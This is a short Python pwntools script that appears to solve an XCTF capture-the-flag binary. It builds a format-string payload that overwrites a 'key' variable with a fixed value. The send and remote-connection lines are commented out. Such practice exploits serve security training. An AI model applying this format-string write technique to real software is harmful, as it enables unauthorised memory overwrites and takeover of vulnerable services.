# zzPwn Header Start
from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='x86', log_level='debug')

elf_path    = './xctf_pwn_104_intime_data_monitor'
elf         = ELF(elf_path)
io          = process(elf_path)
#io          = remote('111.200.241.244',58806)
# zzPwn Header End

payload = fmtstr_payload(12, {elf.symbols['key']: 0x02223322})
#io.sendline(payload)
#io.interactive()